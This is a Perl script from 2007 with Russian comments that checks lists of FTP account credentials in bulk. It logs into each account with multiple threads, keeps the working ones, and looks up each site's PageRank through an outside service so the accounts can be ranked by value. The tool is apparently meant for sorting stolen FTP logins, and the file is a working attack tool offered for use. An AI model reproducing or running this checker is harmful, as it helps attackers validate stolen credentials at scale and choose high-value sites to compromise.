#!usr/bin/perl
############[ftp cheker&PR-er&cleaner v1.7]######
#								coded by genom--
# я уже писал несколько софтвин на перле с помощью которых можно былобы выполнять такиеже действия 
# но товарищ +toxa+ подкинул мысль о том - что заебешься ими чекать много аков - как итог был рожден в безвольных муках сей скрипт
# сначала была написана гуи версия - но вследствии подглючивания перловского гуя при выходе из под потоков и иных действий
# мною было принято решение написать консольную версию ибо она небудет глючить и работать я надеюсь будет шустрее =)
# итак чтоже эта хрень умеет делать - чекать акки на валид, выставлять их page rank, и выставлять имя сайта и как итог мы имеем 
# список вида ftp://peruhuan:tux123@peruhuanuco.com [OK] PR=3 site->peruhuanuco.com - и в окончании все акки будут отсортированы по PR
################# волт 13. 2007 г.##############

use LWP::UserAgent;
use threads;
use threads::shared;
my $num : shared;
my $ua = LWP::UserAgent->new(agent => 'Sony Play Station 2',timeout => 5);

$pr=0; # 0- просто чек, 1- чек и простановка пиара , 2 - только простановка пиара,3 - только сортировка и очистка от повторов
$sleep=0; # слип на всякий случай а то хз могут забанить на сайте где чекается пиар - хотя пока со мной этого не случалось

$time=localtime;
print '#'x 50,"\nStart in $time\n";


if(@ARGV[0]&&@ARGV[1]){
@itogo;
print"~~~~~~~~Round 1 - cleaning.~~~~~~~~\n";
open akk,"<@ARGV[0]" or die "Bad file name =(";
foreach(<akk>){if($_=~/([^ ]*:[^ ]*\@[^ \n]*)/){push @ak_74 =>$1."\n";$a++;}}
print "Total found $a ftp accounts.\nAdding \"ftp://\" & sort & clean.\n";
for ($i=0;$i<$a;$i++){if(@ak_74[$i]=~/ftp:\/\//==0){@ak_74[$i]='ftp://'.@ak_74[$i];}}
@ak_74=sort @ak_74;
open dmp,">@ARGV[0]"; print dmp @ak_74;close dmp;  # сохраняем отсортированный список
print "Killing accounts copy\n";
for($i=0;$i<$a;$i++){@ak_74[$i]='' if @ak_74[$i]eq@ak_74[$i+1]}
$a=0;close akk;
open dmp,">@ARGV[0]"; print dmp @ak_74;close dmp; # сохраняем список без копий
open akk,"<@ARGV[0]";
@ak_74=<akk>;foreach(@ak_74){$a++;}
print "Total found $a good accounts.\n";
exit if $pr==3;
print "~~~~~~~~Round 2 - check.~~~~~~~~\n";

$num=0;
for (1..@ARGV[1]){threads->create(\&bzdish);}
sleep 1 while $num<$a;
print "\nKilling threads...\n";
foreach(threads->list){$_->join};

if ($pr==1 | $pr==2){print"~~~~~~~~Round 3 - Sorting by PR.~~~~~~~~\n";
open asrt,"<checked_ftp.txt";
@ak_74=<asrt>; close asrt;
open asrt,">checked_ftp.txt";
for($i=10;$i>=0;$i--){
foreach(@ak_74){print asrt $_ if $_=~/PR=$i/}
}
}

$time=localtime;
print '#'x 50,"\nEnd in $time\n";
}
else{
print <<USAGE; 
#########[ftp cheker & PR-er & cleaner & sorter v1.7]#########
#                       coded by genom--                     #
# Use:                                                       #
# ftp_check.pl [file_name] [threads]                         #
# ftp_check.pl list_ftp_acc.txt 10                           #
#                     No SPloA, No World.                    #
#############################2007#############################
USAGE
}

sub bzdish{
eshe:
$akk=@ak_74[$num];
chomp$akk;
goto end if $akk eq'' or $akk eq'ftp://';
$num++;
print "Do $num $akk\n";

if ($pr ne 2){
my $res = $ua->get($akk);
if($res->as_string=~/200 OK/){$rez=" [OK]" if $pr}
else{$rez=" [BAD]" if $pr;goto end;}}

if($pr==1|$pr==2){
if($akk=~tr/@/@/ >1){for(1..$akk=~tr/@/@/-1){$akk=~s(@)(###)}}
$akk=~/@/;$serv=substr($akk,pos($akk));$akk=~s(###)(@);
my ($temp,$serv)=split(/@/,$akk); # вырезаем имя сервера
$serv=~s/ftp\.//i;
sleep $sleep;
$rez='' if $pr==2;
my $res = $ua->post("http://page-rank.org.ua/index.php", {'UrlList' => 'http://'.$serv , 'CSV' => 'on'});
if ($res->as_string=~/$serv"[^\n]*/){
my $pr=$&;
$pr=~s/$serv",/PR=/ig;
$rez.=" $pr site->$serv";}
else{print 'error get PR\n';}
$rez=~s/PR=-1/PR=0/ig;
}
open lol,">>checked_ftp.txt";print lol "$akk $rez\n";close lol; # пишет в файл только валид 
end:
goto eshe if $num<$a;
}